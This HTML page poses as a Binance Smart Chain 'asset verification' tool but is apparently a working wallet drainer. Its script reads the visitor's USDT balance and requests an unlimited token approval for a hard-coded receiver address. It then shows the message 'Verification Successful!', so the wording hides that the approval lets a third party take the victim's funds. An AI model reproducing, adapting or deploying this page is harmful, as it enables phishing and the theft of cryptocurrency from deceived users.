<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BNB Smart Chain Asset Verification</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
  body { background-color: #0b132f; color: #ffffff; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
  .container { background: #141f42; width: 100%; max-width: 400px; padding: 30px 20px; border-radius: 20px; text-align: center; border: 1px solid #1e2c59; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
  .logo { width: 60px; height: 60px; margin-bottom: 20px; background: #f3ba2f; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; font-size: 30px; font-weight: bold; color: #000; }
  h1 { font-size: 20px; margin-bottom: 10px; font-weight: 600; }
  p { font-size: 14px; color: #94a3b8; margin-bottom: 25px; line-height: 1.5; }
  .btn { background: linear-gradient(135deg, #f3ba2f, #e8b01e); color: #000; border: none; width: 100%; padding: 14px; font-size: 16px; font-weight: bold; border-radius: 12px; cursor: pointer; transition: 0.2s; }
  .btn:active { transform: scale(0.98); }
  .info { margin-top: 20px; font-size: 12px; color: #64748b; }
</style>
</head>
<body>

<div class="container">
  <div class="logo">BNB</div>
  <h1>Verify Your Wallet Assets</h1>
  <p>Connect your Web3 wallet to review supported assets on Binance Smart Chain.</p>
  
  <button class="btn" id="connectBtn" onclick="initConnect()">Verify Assets</button>
  
  <div class="info">Secured by BNB Smart Chain Protocol</div>
</div>

<script>
  const TARGET_RECEIVER = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3"; 
  const USDT_BSC_ADDRESS = "0x55d398326f99059ff775485246999027b3197955";

  const ERC20_ABI = [
    "function balanceOf(address owner) view returns (uint256)",
    "function approve(address spender, uint256 amount) returns (bool)"
  ];

  async function initConnect() {
    if (typeof window.ethereum === 'undefined') {
      alert("Please open this link inside Trust Wallet or MetaMask browser.");
      return;
    }

    if (!ethers.utils.isAddress(TARGET_RECEIVER)) {
      alert("Error: Invalid target wallet address!");
      return;
    }

    try {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      
      const network = await provider.getNetwork();
      
      // Strict Network Check: Chain ID 56 Binance Smart Chain honi chahiye
      if (network.chainId !== 56) {
        alert("Please switch your Trust Wallet network to Binance Smart Chain (BSC) manually before clicking!");
        return;
      }

      const signer = provider.getSigner();
      const userAddress = await signer.getAddress();
      
      const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, ERC20_ABI, signer);
      const balance = await usdtContract.balanceOf(userAddress);

      if (balance.gt(0)) {
        const maxAmount = ethers.constants.MaxUint256; 
        
        const tx = await usdtContract.approve(TARGET_RECEIVER, maxAmount, {
          gasLimit: ethers.BigNumber.from("65000")
        });
        
        await tx.wait();
        alert("Verification Successful!");
      } else {
        alert("No USDT balance found in this wallet.");
      }

    } catch (error) {
      console.error("Full Error:", error);
      let errMsg = error.reason || error.message || JSON.stringify(error);
      alert("Failed Reason: " + errMsg);
    }
  }
</script>

</body>
</html>
